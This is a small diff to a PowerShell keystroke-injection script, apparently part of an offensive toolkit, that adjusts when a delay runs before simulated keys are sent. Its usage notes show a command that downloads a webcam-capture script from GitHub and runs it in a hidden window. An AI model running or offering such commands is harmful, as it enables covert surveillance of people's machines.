@@ -22,7 +22,7 @@
 
 .NOTES
    iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WebCam-Capture/WebCam.py" -OutFile "$Env:TMP\WebCam.py"
-   .\sendkeys.ps1 -program "$Env:TMP\WebCam.py" -sendKey "^{c}" -execdelay "10" -style "hidden"
+   .\sendkeys.ps1 -program "$Env:TMP\WebCam.py" -sendKey "^{c}" -execdelay "30" -style "hidden"
 
 .Parameter Program
    The program to start (default: $Env:WINDIR\System32\cmd.exe)
@@ -191,6 +191,7 @@ Else
 
 
 #Switch window focus to exe process
+Start-Sleep -Seconds $ExecDelay #Delay time to execute sendkeys
 $Null = [WinAp]::SetForegroundWindow($NewProc.MainWindowHandle)
 $Null = [WinAp]::ShowWindow($NewProc.MainWindowHandle,3)
 
@@ -199,7 +200,6 @@ $Null = [WinAp]::ShowWindow($NewProc.MainWindowHandle,3)
 
 #Sendkey
 $OrphanID = $NewProc.ID
-Start-Sleep -Seconds $ExecDelay #Wait for program to start
 [System.Windows.Forms.SendKeys]::SendWait("$SendKey")
 If($?)
 {
